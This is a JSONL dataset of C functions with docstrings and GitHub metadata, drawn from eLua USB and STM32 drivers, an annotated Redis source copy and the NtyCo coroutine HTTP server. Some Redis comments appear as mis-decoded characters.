{"docstring": "//*****************************************************************************\n//\n// This function is called by the USB device stack whenever the device is\n// disconnected from the host.\n//\n//*****************************************************************************\n", "func_signal": "static void\nHandleDisconnect(void *pvInstance)", "code": "{\n    const tUSBDBulkDevice *psBulkDevice;\n    tBulkInstance *psInst;\n\n    ASSERT(pvInstance != 0);\n\n    //\n    // Create the instance pointer.\n    //\n    psBulkDevice = (const tUSBDBulkDevice *)pvInstance;\n\n    //\n    // Get a pointer to our instance data.\n    //\n    psInst = psBulkDevice->psPrivateBulkData;\n\n    //\n    // If we are not currently connected so let the client know we are open\n    // for business.\n    //\n    if(psInst->bConnected)\n    {\n        //\n        // Pass the disconnected event to the client.\n        //\n        psBulkDevice->pfnRxCallback(psBulkDevice->pvRxCBData,\n                                    USB_EVENT_DISCONNECTED, 0, (void *)0);\n    }\n\n    //\n    // Remember that we are no longer connected.\n    //\n    psInst->bConnected = false;\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// Called by the USB stack whenever a configuration change occurs.\n//\n//*****************************************************************************\n", "func_signal": "static void\nHandleConfigChange(void *pvInstance, unsigned long ulInfo)", "code": "{\n    tBulkInstance *psInst;\n    const tUSBDBulkDevice *psDevice;\n\n    ASSERT(pvInstance != 0);\n\n    //\n    // Create a device instance pointer.\n    //\n    psDevice = (const tUSBDBulkDevice *)pvInstance;\n\n    //\n    // Get a pointer to our instance data.\n    //\n    psInst = psDevice->psPrivateBulkData;\n\n    //\n    // Set all our endpoints to idle state.\n    //\n    psInst->eBulkRxState = BULK_STATE_IDLE;\n    psInst->eBulkTxState = BULK_STATE_IDLE;\n\n    //\n    // If we have a control callback, let the client know we are open for\n    // business.\n    //\n    if(psDevice->pfnRxCallback)\n    {\n        //\n        // Pass the connected event to the client.\n        //\n        psDevice->pfnRxCallback(psDevice->pvRxCBData, USB_EVENT_CONNECTED, 0,\n                                (void *)0);\n    }\n\n    //\n    // Remember that we are connected.\n    //\n    psInst->bConnected = true;\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n//! Shut down the bulk device.\n//!\n//! \\param pvInstance is the pointer to the device instance structure as\n//! returned by USBDBulkInit().\n//!\n//! This function terminates device operation for the instance supplied and\n//! removes the device from the USB bus.  This function should not be called\n//! if the bulk device is part of a composite device and instead the\n//! USBDCompositeTerm() function should be called for the full composite\n//! device.\n//!\n//! Following this call, the \\e pvInstance instance should not me used in any\n//! other calls.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nUSBDBulkTerm(void *pvInstance)", "code": "{\n    tBulkInstance *psInst;\n\n    ASSERT(pvInstance);\n\n    //\n    // Get a pointer to our instance data.\n    //\n    psInst = ((tUSBDBulkDevice *)pvInstance)->psPrivateBulkData;\n\n    //\n    // Terminate the requested instance.\n    //\n    USBDCDTerm(USB_BASE_TO_INDEX(psInst->ulUSBBase));\n\n    psInst->ulUSBBase = 0;\n    psInst->psDevInfo = (tDeviceInfo *)0;\n    psInst->psConfDescriptor = (tConfigDescriptor *)0;\n\n    return;\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n//! Initializes bulk device operation for a given USB controller.\n//!\n//! \\param ulIndex is the index of the USB controller which is to be\n//! initialized for bulk device operation.\n//! \\param psDevice points to a structure containing parameters customizing\n//! the operation of the bulk device.\n//!\n//! This call is very similar to USBDBulkInit() except that it is used for\n//! initializing an instance of the bulk device for use in a composite device.\n//!\n//! \\return Returns zero on failure or a non-zero value that should be\n//! used with the remaining USB HID Bulk APIs.\n//\n//*****************************************************************************\n", "func_signal": "void *\nUSBDBulkCompositeInit(unsigned long ulIndex, const tUSBDBulkDevice *psDevice)", "code": "{\n    tBulkInstance *psInst;\n    tDeviceDescriptor *psDevDesc;\n\n    //\n    // Check parameter validity.\n    //\n    ASSERT(ulIndex == 0);\n    ASSERT(psDevice);\n    ASSERT(psDevice->ppStringDescriptors);\n    ASSERT(psDevice->psPrivateBulkData);\n    ASSERT(psDevice->pfnRxCallback);\n    ASSERT(psDevice->pfnTxCallback);\n\n    //\n    // Initialize the workspace in the passed instance structure.\n    //\n    psInst = psDevice->psPrivateBulkData;\n    psInst->psConfDescriptor = (tConfigDescriptor *)g_pBulkDescriptor;\n    psInst->psDevInfo = &g_sBulkDeviceInfo;\n    psInst->ulUSBBase = USB0_BASE;\n    psInst->eBulkRxState = BULK_STATE_UNCONFIGURED;\n    psInst->eBulkTxState = BULK_STATE_UNCONFIGURED;\n    psInst->usDeferredOpFlags = 0;\n    psInst->bConnected = false;\n\n    //\n    // Set the default endpoint and interface assignments.\n    //\n    psInst->ucINEndpoint = DATA_IN_ENDPOINT;\n    psInst->ucOUTEndpoint = DATA_OUT_ENDPOINT;\n    psInst->ucInterface = 0;\n\n    //\n    // Fix up the device descriptor with the client-supplied values.\n    //\n    psDevDesc = (tDeviceDescriptor *)psInst->psDevInfo->pDeviceDescriptor;\n    psDevDesc->idVendor = psDevice->usVID;\n    psDevDesc->idProduct = psDevice->usPID;\n\n    //\n    // Fix up the configuration descriptor with client-supplied values.\n    //\n    psInst->psConfDescriptor->bmAttributes = psDevice->ucPwrAttributes;\n    psInst->psConfDescriptor->bMaxPower =\n                        (unsigned char)(psDevice->usMaxPowermA / 2);\n\n    //\n    // Plug in the client's string stable to the device information\n    // structure.\n    //\n    psInst->psDevInfo->ppStringDescriptors = psDevice->ppStringDescriptors;\n    psInst->psDevInfo->ulNumStringDescriptors\n            = psDevice->ulNumStringDescriptors;\n\n    //\n    // Set the device instance.\n    //\n    psInst->psDevInfo->pvInstance = (void *)psDevice;\n\n    //\n    // Initialize the USB tick module, this will prevent it from being\n    // initialized later in the call to USBDCDInit();\n    //\n    InternalUSBTickInit();\n\n    //\n    // Register our tick handler (this must be done after USBDCDInit).\n    //\n    InternalUSBRegisterTickHandler(USB_TICK_HANDLER_DEVICE,\n                                   BulkTickHandler,\n                                   (void *)psDevice);\n\n    //\n    // Return the pointer to the instance indicating that everything went well.\n    //\n    return((void *)psDevice);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// This function is called by the USB device stack whenever the bus is put into\n// suspend state.\n//\n//*****************************************************************************\n", "func_signal": "static void\nHandleSuspend(void *pvInstance)", "code": "{\n    const tUSBDBulkDevice *psBulkDevice;\n\n    ASSERT(pvInstance != 0);\n\n    //\n    // Create the instance pointer.\n    //\n    psBulkDevice = (const tUSBDBulkDevice *)pvInstance;\n\n    //\n    // Pass the event on to the client.\n    //\n    psBulkDevice->pfnRxCallback(psBulkDevice->pvRxCBData, USB_EVENT_SUSPEND, 0,\n                                (void *)0);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "/**\n  * @brief  Configures the SysTick clock source.\n  * @param  SysTick_CLKSource: specifies the SysTick clock source.\n  *   This parameter can be one of the following values:\n  *     @arg SysTick_CLKSource_HCLK_Div8: AHB clock divided by 8 selected as SysTick clock source.\n  *     @arg SysTick_CLKSource_HCLK: AHB clock selected as SysTick clock source.\n  * @retval None\n  */\n", "func_signal": "void SysTick_CLKSourceConfig(uint32_t SysTick_CLKSource)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_SYSTICK_CLK_SOURCE(SysTick_CLKSource));\n  if (SysTick_CLKSource == SysTick_CLKSource_HCLK)\n  {\n    SysTick->CTRL |= SysTick_CLKSource_HCLK;\n  }\n  else\n  {\n    SysTick->CTRL &= SysTick_CLKSource_HCLK_Div8;\n  }\n}", "path": "elua/src/platform/stm32f4/FWLib/library/src/misc.c", "commit_date": "2013-05-28 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "/* Object command allows to inspect the internals of an Redis Object.\n * Usage: OBJECT <refcount|encoding|idletime> <key> */\n", "func_signal": "void objectCommand(redisClient *c)", "code": "{\n    robj *o;\n\n    if (!strcasecmp(c->argv[1]->ptr,\"refcount\") && c->argc == 3) {\n        if ((o = objectCommandLookupOrReply(c,c->argv[2],shared.nullbulk))\n                == NULL) return;\n        addReplyLongLong(c,o->refcount);\n    } else if (!strcasecmp(c->argv[1]->ptr,\"encoding\") && c->argc == 3) {\n        if ((o = objectCommandLookupOrReply(c,c->argv[2],shared.nullbulk))\n                == NULL) return;\n        addReplyBulkCString(c,strEncoding(o->encoding));\n    } else if (!strcasecmp(c->argv[1]->ptr,\"idletime\") && c->argc == 3) {\n        if ((o = objectCommandLookupOrReply(c,c->argv[2],shared.nullbulk))\n                == NULL) return;\n        addReplyLongLong(c,estimateObjectIdleTime(o));\n    } else {\n        addReplyError(c,\"Syntax error. Try OBJECT (refcount|encoding|idletime)\");\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* float\u05b5\u0132\ue8ec\u06bb\u0221\u052d\u02bc\u05b5\u02b1\uda4e\udf3b\u0221\u0137\u04bb\u03aagetLongDoubleFromObjectOrReply*/\n", "func_signal": "void incrbyfloatCommand(redisClient *c)", "code": "{\n    long double incr, value;\n    robj *o, *new, *aux;\n\n    o = lookupKeyWrite(c->db,c->argv[1]);\n    if (o != NULL && checkType(c,o,REDIS_STRING)) return;\n    /* \u06bb\u0221\u052d\u02bc\u05b5\u02b1\uda4e\udf3b\u0221\u0137\u04bb\u03aagetLongDoubleFromObjectOrReply */\n    if (getLongDoubleFromObjectOrReply(c,o,&value,NULL) != REDIS_OK ||\n        getLongDoubleFromObjectOrReply(c,c->argv[2],&incr,NULL) != REDIS_OK)\n        return;\n\n    value += incr;\n    if (isnan(value) || isinf(value)) {\n        addReplyError(c,\"increment would produce NaN or Infinity\");\n        return;\n    }\n    new = createStringObjectFromLongDouble(value);\n    if (o)\n        dbOverwrite(c->db,c->argv[1],new);\n    else\n        dbAdd(c->db,c->argv[1],new);\n    signalModifiedKey(c->db,c->argv[1]);\n    notifyKeyspaceEvent(REDIS_NOTIFY_STRING,\"incrbyfloat\",c->argv[1],c->db->id);\n    server.dirty++;\n    addReplyBulk(c,new);\n\n    /* Always replicate INCRBYFLOAT as a SET command with the final value\n     * in order to make sure that differences in float precision or formatting\n     * will not create differences in replicas or after an AOF restart. */\n    aux = createStringObject(\"SET\",3);\n    rewriteClientCommandArgument(c,0,aux);\n    decrRefCount(aux);\n    rewriteClientCommandArgument(c,2,new);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u04fb\u0679\u0336\u05b5\u0132\u02b5-1 */\n", "func_signal": "void incrDecrCommand(redisClient *c, long long incr)", "code": "{\n    long long value, oldvalue;\n    robj *o, *new;\n\n    o = lookupKeyWrite(c->db,c->argv[1]);\n    if (o != NULL && checkType(c,o,REDIS_STRING)) return;\n    if (getLongLongFromObjectOrReply(c,o,&value,NULL) != REDIS_OK) return;\n\n\t//\u052d\u02bc\u05b5\u05b5\u03aa\u05b5\n    oldvalue = value;\n    if ((incr < 0 && oldvalue < 0 && incr < (LLONG_MIN-oldvalue)) ||\n        (incr > 0 && oldvalue > 0 && incr > (LLONG_MAX-oldvalue))) {\n        addReplyError(c,\"increment or decrement would overflow\");\n        return;\n    }\n    \n    //\u05b5\u02b5\u05b5\n    value += incr;\n    new = createStringObjectFromLongLong(value);\n    \n    //\u05b5\u077f\n    if (o)\n        dbOverwrite(c->db,c->argv[1],new);\n    else\n        dbAdd(c->db,c->argv[1],new);\n    \n    //\u04f7\u03e2\n    signalModifiedKey(c->db,c->argv[1]);\n    notifyKeyspaceEvent(REDIS_NOTIFY_STRING,\"incrby\",c->argv[1],c->db->id);\n    server.dirty++;\n    addReply(c,shared.colon);\n    addReply(c,new);\n    addReply(c,shared.crlf);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* This is a helper function for the OBJECT command. We need to lookup keys\n * without any modification of LRU or other parameters. */\n/* obj\u0132\ue8ec */\n", "func_signal": "robj *objectCommandLookup(redisClient *c, robj *key)", "code": "{\n    dictEntry *de;\n\t\n\t//clientdbdict\u05b5\u0432key\n    if ((de = dictFind(c->db->dict,key->ptr)) == NULL) return NULL;\n    return (robj*) dictGetVal(de);\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* key\u06b5\u02b1\u05b5flag\u03aaREDIS_SET_NO_FLAGS\ued7d\u02b1\u4d65\u03bb\u03aa */\n", "func_signal": "void setexCommand(redisClient *c)", "code": "{\n    c->argv[3] = tryObjectEncoding(c->argv[3]);\n    setGenericCommand(c,REDIS_SET_NO_FLAGS,c->argv[1],c->argv[3],c->argv[2],UNIT_SECONDS,NULL,NULL);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u077crobj\u0435\u00fc\u00f50\u0377\u0176 */\n", "func_signal": "void decrRefCount(robj *o)", "code": "{\n\t//\u05ae\u01f0\u00fc\u047e<=0\u02e3\u02f5\ucce3\n    if (o->refcount <= 0) redisPanic(\"decrRefCount against refcount <= 0\");\n    if (o->refcount == 1) {\n    \t//\u05ae\u01f0\u00fc\u03aa1\u0675\u077c\u04bb\u03a3\u01e1\u0431\u03ba\u03b6\u02e3\u053e\u037f\u0377\u0176\n        switch(o->type) {\n        case REDIS_STRING: freeStringObject(o); break;\n        case REDIS_LIST: freeListObject(o); break;\n        case REDIS_SET: freeSetObject(o); break;\n        case REDIS_ZSET: freeZsetObject(o); break;\n        case REDIS_HASH: freeHashObject(o); break;\n        default: redisPanic(\"Unknown object type\"); break;\n        }\n        zfree(o);\n    } else {\n    \t//>1\u00fc\u05bb\u04aa\u0135\u077c\u00fc\n        o->refcount--;\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u05b4\u0436getCommand\u05b8 */\n", "func_signal": "void mgetCommand(redisClient *c)", "code": "{\n    int j;\n\n    addReplyMultiBulkLen(c,c->argc-1);\n    for (j = 1; j < c->argc; j++) {\n        robj *o = lookupKeyRead(c->db,c->argv[j]);\n        if (o == NULL) {\n            addReply(c,shared.nullbulk);\n        } else {\n            if (o->type != REDIS_STRING) {\n                addReply(c,shared.nullbulk);\n            } else {\n                addReplyBulk(c,o);\n            }\n        }\n    }\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* Given an object returns the min number of seconds the object was never\n * requested, using an approximated LRU algorithm. */\n", "func_signal": "unsigned long estimateObjectIdleTime(robj *o)", "code": "{\n    if (server.lruclock >= o->lru) {\n        return (server.lruclock - o->lru) * REDIS_LRU_CLOCK_RESOLUTION;\n    } else {\n        return ((REDIS_LRU_CLOCK_MAX - o->lru) + server.lruclock) *\n                    REDIS_LRU_CLOCK_RESOLUTION;\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u05b8\ue8ecClient\u043b\u0221\u05b5 */\n", "func_signal": "void incrbyCommand(redisClient *c)", "code": "{\n    long long incr;\n\n    if (getLongLongFromObjectOrReply(c, c->argv[2], &incr, NULL) != REDIS_OK) return;\n    incrDecrCommand(c,incr);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* Try to encode a string object in order to save space */\n/* \u04bbrobj\u0435\u0136\u05b7\u04aa\u03aa\u02a1\u057c */\n", "func_signal": "robj *tryObjectEncoding(robj *o)", "code": "{\n    long value;\n    sds s = o->ptr;\n    size_t len;\n\n    if (o->encoding != REDIS_ENCODING_RAW)\n    \t//robj\u047e\u02e3\u05b1\u04f7\n        return o; /* Already encoded */\n\n    /* It's not safe to encode shared objects: shared objects can be shared\n     * everywhere in the \"object space\" of Redis. Encoded objects can only\n     * appear as \"values\" (and not, for instance, as keys) */\n     /* robj\u00fc1\u00f5\u02b1\u01f2\u022b\u0225obj,\u03aa\u01f9 */\n     if (o->refcount > 1) return o;\n\n    /* Currently we try to encode only strings */\n    redisAssertWithInfo(NULL,o,o->type == REDIS_STRING);\n\n    /* Check if we can represent this string as a long integer */\n    len = sdslen(s);\n    if (len > 21 || !string2l(s,len,&value)) {\n        /* We can't encode the object...\n         *\n         * Do the last try, and at least optimize the SDS string inside\n         * the string object to require little space, in case there\n         * is more than 10% of free space at the end of the SDS string.\n         *\n         * We do that for larger strings, using the arbitrary value\n         * of 32 bytes. This code was backported from the unstable branch\n         * where this is performed when the object is too large to be\n         * encoded as EMBSTR. */\n        if (len > 32 &&\n            o->encoding == REDIS_ENCODING_RAW &&\n            sdsavail(s) > len/10)\n        {\n        \t//sdsRemoveFreeSpace0->ptr\u0435\u05b7\u0435\u013f\u0578\u01b3\n            o->ptr = sdsRemoveFreeSpace(o->ptr);\n        }\n        /* Return the original object. */\n        return o;\n    }\n\n    /* Ok, this object can be encoded...\n     *\n     * Can I use a shared object? Only if the object is inside a given range\n     *\n     * Note that we also avoid using shared integers when maxmemory is used\n     * because every object needs to have a private LRU field for the LRU\n     * algorithm to work well. */\n    if ((server.maxmemory == 0 ||\n         (server.maxmemory_policy != REDIS_MAXMEMORY_VOLATILE_LRU &&\n          server.maxmemory_policy != REDIS_MAXMEMORY_ALLKEYS_LRU)) &&\n        value >= 0 && value < REDIS_SHARED_INTEGERS)\n    {\n        decrRefCount(o);\n        incrRefCount(shared.integers[value]);\n        return shared.integers[value];\n    } else {\n        o->encoding = REDIS_ENCODING_INT;\n        sdsfree(o->ptr);\n        o->ptr = (void*) value;\n        return o;\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u0377hashObject2\u02bd1o-ptr\u05b5\udb4e\udf3b1\u0479o->ptr */\n", "func_signal": "void freeHashObject(robj *o)", "code": "{\n    switch (o->encoding) {\n    case REDIS_ENCODING_HT:\n        dictRelease((dict*) o->ptr);\n        break;\n    case REDIS_ENCODING_ZIPLIST:\n        zfree(o->ptr);\n        break;\n    default:\n        redisPanic(\"Unknown hash encoding type\");\n        break;\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* SET key value [NX] [XX] [EX <seconds>] [PX <milliseconds>] */\n", "func_signal": "void setCommand(redisClient *c)", "code": "{\n    int j;\n    robj *expire = NULL;\n    int unit = UNIT_SECONDS;\n    int flags = REDIS_SET_NO_FLAGS;\n\n    for (j = 3; j < c->argc; j++) {\n        char *a = c->argv[j]->ptr;\n        robj *next = (j == c->argc-1) ? NULL : c->argv[j+1];\n\t\t\n\t\t/* \u0368\u0436SET */\n        if ((a[0] == 'n' || a[0] == 'N') &&\n            (a[1] == 'x' || a[1] == 'X') && a[2] == '\\0') {\n            flags |= REDIS_SET_NX;\n        } else if ((a[0] == 'x' || a[0] == 'X') &&\n                   (a[1] == 'x' || a[1] == 'X') && a[2] == '\\0') {\n            flags |= REDIS_SET_XX;\n        } else if ((a[0] == 'e' || a[0] == 'E') &&\n                   (a[1] == 'x' || a[1] == 'X') && a[2] == '\\0' && next) {\n            unit = UNIT_SECONDS;\n            expire = next;\n            j++;\n        } else if ((a[0] == 'p' || a[0] == 'P') &&\n                   (a[1] == 'x' || a[1] == 'X') && a[2] == '\\0' && next) {\n            unit = UNIT_MILLISECONDS;\n            expire = next;\n            j++;\n        } else {\n            addReply(c,shared.syntaxerr);\n            return;\n        }\n    }\n\n\t//\u02b5\u02b5\u00f7\u05b8\uedfd\n    c->argv[2] = tryObjectEncoding(c->argv[2]);\n    setGenericCommand(c,flags,c->argv[1],c->argv[2],expire,unit,NULL,NULL);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u05b7\u01f7\ud98e\udf33\udb8e\udd36\u0223512*1024*1024\u05bd\u06b3 */\n", "func_signal": "static int checkStringLength(redisClient *c, long long size)", "code": "{\n    if (size > 512*1024*1024) {\n        addReplyError(c,\"string exceeds maximum allowed size (512MB)\");\n        return REDIS_ERR;\n    }\n    return REDIS_OK;\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* key\u06b5\u02b1\u05b5flag\u03aaREDIS_SET_NO_FLAGS\ued7d\u02b1\u4d65\u03bb\u03aa */\n", "func_signal": "void psetexCommand(redisClient *c)", "code": "{\n    c->argv[3] = tryObjectEncoding(c->argv[3]);\n    setGenericCommand(c,REDIS_SET_NO_FLAGS,c->argv[1],c->argv[3],c->argv[2],UNIT_MILLISECONDS,NULL,NULL);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u05f7\u02b5\u04b2\u05b7\u02bd\u0532\u02bd */\n", "func_signal": "void appendCommand(redisClient *c)", "code": "{\n    size_t totlen;\n    robj *o, *append;\n\n    o = lookupKeyWrite(c->db,c->argv[1]);\n    if (o == NULL) {\n        /* Create the key */\n        //key\u05b5\n        c->argv[2] = tryObjectEncoding(c->argv[2]);\n        dbAdd(c->db,c->argv[1],c->argv[2]);\n        incrRefCount(c->argv[2]);\n        totlen = stringObjectLen(c->argv[2]);\n    } else {\n        /* Key exists, check type */\n        if (checkType(c,o,REDIS_STRING))\n            return;\n\n        /* \"append\" is an argument, so always an sds */\n        //\u05b5\u05b7\n        append = c->argv[2];\n        totlen = stringObjectLen(o)+sdslen(append->ptr);\n        if (checkStringLength(c,totlen) != REDIS_OK)\n            return;\n\n        /* Append the value */\n        //\u05f7\u05b7\n        o = dbUnshareStringValue(c->db,c->argv[1],o);\n        o->ptr = sdscatlen(o->ptr,append->ptr,sdslen(append->ptr));\n        totlen = sdslen(o->ptr);\n    }\n    \n    //\u0221\u0638\n    signalModifiedKey(c->db,c->argv[1]);\n    notifyKeyspaceEvent(REDIS_NOTIFY_STRING,\"append\",c->argv[1],c->db->id);\n    server.dirty++;\n    addReplyLongLong(c,totlen);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* This function set the ref count to zero without freeing the object.\n * It is useful in order to pass a new object to functions incrementing\n * the ref count of the received object. Example:\n *\n *    functionThatWillIncrementRefCount(resetRefCount(CreateObject(...)));\n *\n * Otherwise you need to resort to the less elegant pattern:\n *\n *    *obj = createObject(...);\n *    functionThatWillIncrementRefCount(obj);\n *    decrRefCount(obj);\n */\n", "func_signal": "robj *resetRefCount(robj *obj)", "code": "{\n    obj->refcount = 0;\n    return obj;\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* \u05b8\ue8ecClient\u043b\u0221\u05b5 */\n", "func_signal": "void decrbyCommand(redisClient *c)", "code": "{\n    long long incr;\n\n    if (getLongLongFromObjectOrReply(c, c->argv[2], &incr, NULL) != REDIS_OK) return;\n    incrDecrCommand(c,-incr);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* Equal string objects return 1 if the two objects are the same from the\n * point of view of a string comparison, otherwise 0 is returned. Note that\n * this function is faster then checking for (compareStringObject(a,b) == 0)\n * because it can perform some more optimization. */\n", "func_signal": "int equalStringObjects(robj *a, robj *b)", "code": "{\n    if (a->encoding != REDIS_ENCODING_RAW && b->encoding != REDIS_ENCODING_RAW){\n        return a->ptr == b->ptr;\n    } else {\n        return compareStringObjects(a,b) == 0;\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* free Obj\u0435\u0636 */\n", "func_signal": "void freeStringObject(robj *o)", "code": "{\n    if (o->encoding == REDIS_ENCODING_RAW) {\n        sdsfree(o->ptr);\n    }\n}", "path": "Redis-Code/wrapper/object.c", "commit_date": "2014-11-02 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/* key\u06b5\u02b1\u05b5flag\u03aaREDIS_SET_NX\u02b1 */\n", "func_signal": "void setnxCommand(redisClient *c)", "code": "{\n    c->argv[2] = tryObjectEncoding(c->argv[2]);\n    setGenericCommand(c,REDIS_SET_NX,c->argv[1],c->argv[2],NULL,0,shared.cone,shared.czero);\n}", "path": "Redis-Code/struct/t_string.c", "commit_date": "2014-10-14 00:00:00", "repo_name": "linyiqun/Redis-Code", "stars": 557, "license": "None", "language": "c", "size": 919}
{"docstring": "/**********************************************************************/\n/* Print out an error message with perror() (for system errors; based\n * on value of errno, which indicates system call errors) and exit the\n * program indicating an error. */\n/**********************************************************************/\n", "func_signal": "void error_die(const char *sc)", "code": "{\n    perror(sc);\n    exit(1);\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* A request has caused a call to accept() on the server port to\n * return.  Process the request appropriately.\n * Parameters: the socket connected to the client */\n/**********************************************************************/\n", "func_signal": "void accept_request(void *arg)", "code": "{\n    int *pclient = (int*)arg;\n\tint client = *pclient;\n\t\n    char buf[1024];\n    size_t numchars;\n    char method[255];\n    char url[255];\n    char path[512];\n    size_t i, j;\n    struct stat st;\n    int cgi = 0;      /* becomes true if server decides this is a CGI\n                       * program */\n    char *query_string = NULL;\n\n    numchars = nty_recv(client, buf, sizeof(buf), 0);\n\n    i = 0; j = 0;\n    while (!ISspace(buf[i]) && (i < sizeof(method) - 1))\n    {\n        method[i] = buf[i];\n        i++;\n    }\n    j=i;\n    method[i] = '\\0';\n\n    if (strcasecmp(method, \"GET\") && strcasecmp(method, \"POST\"))\n    {\n        unimplemented(client);\n        return;\n    }\n\n    if (strcasecmp(method, \"POST\") == 0)\n        cgi = 1;\n\n    i = 0;\n    while (ISspace(buf[j]) && (j < numchars))\n        j++;\n    while (!ISspace(buf[j]) && (i < sizeof(url) - 1) && (j < numchars))\n    {\n        url[i] = buf[j];\n        i++; j++;\n    }\n    url[i] = '\\0';\n\n    if (strcasecmp(method, \"GET\") == 0)\n    {\n        query_string = url;\n        while ((*query_string != '?') && (*query_string != '\\0'))\n            query_string++;\n        if (*query_string == '?')\n        {\n            cgi = 1;\n            *query_string = '\\0';\n            query_string++;\n        }\n    }\n\n    sprintf(path, \"htdocs%s\", url);\n    if (path[strlen(path) - 1] == '/')\n        strcat(path, \"index.html\");\n    if (stat(path, &st) == -1) {\n        while ((numchars > 0) && strcmp(\"\\n\", buf))  /* read & discard headers */\n            numchars = get_line(client, buf, sizeof(buf));\n        not_found(client);\n    }\n    else\n    {\n        if ((st.st_mode & S_IFMT) == S_IFDIR)\n            strcat(path, \"/index.html\");\n        if ((st.st_mode & S_IXUSR) ||\n                (st.st_mode & S_IXGRP) ||\n                (st.st_mode & S_IXOTH)    )\n            cgi = 1;\n\n\t\tcgi = 0;\n\t\t\n        if (!cgi)\n            serve_file(client, path);\n        else\n            execute_cgi(client, path, method, query_string);\n    }\n\n    nty_close(client);\n\tfree(pclient);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
